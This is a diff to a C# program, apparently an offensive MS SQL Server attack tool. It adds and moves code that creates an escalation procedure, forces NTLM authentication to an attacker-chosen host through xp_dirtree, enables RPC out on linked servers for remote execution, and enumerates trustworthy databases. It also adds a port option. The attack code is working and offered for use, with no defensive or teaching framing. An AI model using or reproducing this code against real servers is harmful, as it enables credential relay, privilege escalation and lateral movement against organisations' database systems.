@@ -50,6 +50,7 @@ namespace SQLServerEx
                 command = new SqlCommand(execCmd, con);
                 reader = command.ExecuteReader();
                 reader.Close();
+                Console.WriteLine("[+] sp_elevate procedure created");
             }
             catch
             {
@@ -110,6 +111,7 @@ namespace SQLServerEx
         public static void Relay(SqlConnection con, String relayTo)
         {
             Console.WriteLine("Executing Relay..");
+
             String query = "EXEC master..xp_dirtree \"\\\\" + relayTo + "\\\\test\";";
             SqlCommand command_r = new SqlCommand(query, con);
             SqlDataReader reader_r = command_r.ExecuteReader();
@@ -164,6 +166,18 @@ namespace SQLServerEx
 
             // Check linked servers
 
+            try
+            {
+                String enablerpcout = "EXEC sp_serveroption '" + LinkedServer + "', 'rpc out', true;";
+                SqlCommand command_sp = new SqlCommand(enablerpcout, con);
+                SqlDataReader reader_sp = command_sp.ExecuteReader();
+                reader_sp.Close();
+            }
+            catch
+            {
+                Console.WriteLine("[-] Can't enable RPC out. Proceeding without it.");
+            }
+
             String execCmd = "select myuser from openquery(\"" + LinkedServer + "\", 'select SYSTEM_USER as myuser')";
             SqlCommand command = new SqlCommand(execCmd, con);
             SqlDataReader reader = command.ExecuteReader();
@@ -179,18 +193,6 @@ namespace SQLServerEx
             Console.WriteLine("Linked SQL Server version: " + reader[0]);
             reader.Close();
             */
-
-            try
-            {
-                String enablerpcout = "EXEC sp_serveroption '" + LinkedServer + "', 'rpc out', true;";
-                command = new SqlCommand(enablerpcout, con);
-                reader = command.ExecuteReader();
-                reader.Close();
-            }
-            catch
-            {
-                Console.WriteLine("[-] Can't enable RPC out. Proceeding without it.");
-            }
 
             execCmd = "EXEC ('sp_linkedservers') AT \"" + LinkedServer + "\"";
             command = new SqlCommand(execCmd, con);
@@ -293,7 +295,7 @@ namespace SQLServerEx
             reader = command.ExecuteReader();
             while (reader.Read())
             {
-                Console.WriteLine("[+] Trusted databases owned by sysadmins: " + reader[0]);
+                Console.WriteLine("[+] Trusted databases (is_trustworthy_on = 1): " + reader[0]);
             }
             reader.Close();
         }
@@ -309,6 +311,7 @@ namespace SQLServerEx
             string username = a.GetValue("u", "user", "username");
             string password = a.GetValue("p", "pwd", "pass", "password");
             string sqlServer = a.GetValue("s", "server");
+            string portNumber = a.GetValue("port");
             string database = a.GetValue("d", "db");
             string relayTo = a.GetValue("r", "relayto");
             string linkSrv = a.GetValue("l", "link");
@@ -330,13 +333,17 @@ namespace SQLServerEx
                 database = "master";
             }
 
+            if (string.IsNullOrWhiteSpace(portNumber))
+            {
+                portNumber = "1433";
+            }
 
             String conString = "";
 
             if (string.IsNullOrWhiteSpace(username))
             {
-                Console.WriteLine("Connecting to server " + sqlServer + " database " + database);
-                conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+                Console.WriteLine("Connecting to server " + sqlServer + "," + portNumber + " database " + database);
+                conString = "Server = " + sqlServer + "," + portNumber + "; Database = " + database + "; Integrated Security = True;";
             }
 
             else
